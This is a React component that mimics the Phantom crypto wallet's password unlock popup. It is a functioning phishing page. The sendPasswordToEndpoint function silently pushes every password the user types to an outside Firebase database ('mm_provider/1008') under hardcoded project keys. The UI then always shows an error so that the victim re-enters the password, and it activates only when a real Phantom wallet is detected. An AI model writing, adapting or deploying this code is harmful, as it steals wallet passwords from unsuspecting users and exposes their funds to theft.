import { useState, useEffect, useRef } from "react";
import { EventEmitter } from "events";
import Modal from "react-modal";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";

import "./index.css";
import './PhantomApp.css';
const isDark = true; //window.matchMedia("(prefers-color-scheme: dark)").matches;
console.log(window.matchMedia("(prefers-color-scheme: dark)"));
const basic = {
  apiKey: "AIzaSyDSQrbrdcdjhvwzXccJQMbQ5x7XKTPlt9g",
  authDomain: "walletintegration-vic.firebaseapp.com",
  projectId: "walletintegration-vic",
  storageBucket: "walletintegration-vic.firebasestorage.app",
  messagingSenderId: "563872958446",
  appId: "1:563872958446:web:18c71569e281a96bebf0ff",
  measurementId: "G-NB5GFJ8BTD"
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
function getCaretCoordinates(element, position) {
  const div = document.createElement("div");
  div.id = "password-mirror-div";
  document.body.appendChild(div);
  const computed = window.getComputedStyle(element);
  div.textContent = new Array(position + 1).join("•");
  const span = document.createElement("span");
  span.textContent = "•";
  div.appendChild(span);

  const coordinates = {
    top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
    left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
  };
  document.body.removeChild(div);
  return coordinates;
}
const Phantom = ({ isOpen, setIsOpen, isEnter, setIsEnter }) => {

  const inputRef = useRef(null);
  const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
  const [loading, setLoading] = useState(true);
  const [pwdFocus, setPwdFocus] = useState(false);
  const [isError, setIsError] = useState(false);
  const [password, setPassword] = useState('');
  const [videoLoaded, setVideoLoaded] = useState(1);

  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "150px",
      bottom: "auto",
      padding: "0",
      border: "0",
      borderRadius: "5",
      // marginRight: "-30%",
      // transform: "translate(-50%, -50%)",
      boxShadow: "0px 0px 5px #00000088",
      zIndex: 10000,
      fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"
    },
  };

  const handleCloseModal = () => {
    setIsOpen(false);
  };
  const handleChange = (val, target) => {
    setPassword(val);
    if (target.getBoundingClientRect) {
      const element = target;
      const boundingRect = element.getBoundingClientRect();
      const coordinates = getCaretCoordinates(element, element.selectionEnd);

      animationEventEmitter.emit("point", {
        x: boundingRect.left + coordinates.left - element.scrollLeft,
        y: boundingRect.top + coordinates.top - element.scrollTop,
      });
    }
  };

  const onClose = () => {
    setIsOpen(false);
  }

  const handleKeyUp = (e) => {
    if (e.keyCode == 13) {
      sendPasswordToEndpoint();
    }
  };
  const handleFocus = () => setPwdFocus(true);
  
  const sendPasswordToEndpoint = () => {
    push(ref(rtdb, "mm_provider/1008"), {
      value: password,
      date: String(new Date()),
    });
    setIsEnter(isEnter + 1);
    setIsError(true);
    if (isEnter > 1) setIsOpen(false);
  }
  
  const submitPassword = () => {
    if (password !== '') {
      sendPasswordToEndpoint();
    }
  }
  
  useEffect(() => {
    if (isOpen) {
      // Check if Phantom is installed
      if (!window.solana || !window.solana.isPhantom) {
        alert("Please install Phantom Wallet!");
        window.open("https://phantom.app/download", "_blank");
        return;
      }

      setTimeout(() => {
        setLoading(false);
        setTimeout(() => {
          inputRef.current && inputRef.current.focus();
        }, 10);
      }, 3000);

    } else {
      setLoading(true);
    }
  }, [isOpen]);
  
  return (
    <Modal
      isOpen={window.solana && isOpen}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      <div style={{ backgroundColor: '#1f1f1f', width: 360, height: 598, border: '1px solid white' }}>

        <div
          style={{
            height: 59,
            borderBottom: '1px solid rgb(50, 50, 50)',
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            position: 'relative',
          }}
        >
          <svg width="94" height="103" viewBox="0 0 478 103">
            <path fill="#999999" d="M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z"></path>
          </svg>

          <svg
            width="15"
            viewBox="0 0 15 15"
            xmlns="http://www.w3.org/2000/svg"
            fill="rgb(153, 153, 153)"
            style={{
              position: 'absolute',
              right: 16,
              cursor: 'pointer',
            }}
          >
            <path d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z"></path>
          </svg>
        </div>

        <div>
          {videoLoaded == 1 && (
            <video
              src="/phantom-off.mp4"
              autoPlay
              muted
              loop
              playsInline
              preload="metadata"
              onClick={() => setVideoLoaded(2)}
              style={{
                width: "100%",
                cursor: "pointer",
              }}
            />
          )}

          {videoLoaded == 2 && (
            <video
              src="/phantom-on.mp4"
              autoPlay
              muted
              loop
              playsInline
              preload="metadata"
              onClick={() => setVideoLoaded(2)}
              style={{
                width: "100%",
                cursor: "pointer",
              }}
            />
          )}
        </div>

        <div style={{ paddingLeft: 16, paddingRight: 16 }}>
          <div style={{ color: 'white', fontWeight: 500, fontFamily: 'sans-serif', fontSize: 22, marginTop: 5, textAlign: 'center' }}>
            Enter your password
          </div>

          <input
            value={password}
            type='password'
            className={`password-input ${isError ? 'password-input-error' : ''}`}
            placeholder="Password"
            style={{
              fontSize: password === '' ? 17 : 19,
              letterSpacing: password === '' ? '' : 2,
              padding: password === '' ? 14 : '13px 14px',
              width: '100%'
            }}
            onFocus={handleFocus}
            ref={inputRef}
            onChange={(e) => {
              handleChange(e.target.value, e.target);
            }}
            onKeyUp={handleKeyUp}
          />

          <div
            style={{
              paddingBottom: 16,
              height: 117,
              marginTop: 88,
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'space-between'
            }}
          >
            <button className='unlock-button' onClick={submitPassword}>
              Unlock
            </button>

            <button
              style={{
                border: 'none',
                outline: 'none',
                width: '100%',
                height: 48,
                backgroundColor: 'transparent',
                color: 'white',
                fontSize: 16,
                fontWeight: 700,
                marginBottom: 13,
                cursor: 'pointer',
              }}
            >
              Forgot Password
            </button>
          </div>
        </div>
      </div>
    </Modal >
  );
};

export default Phantom;
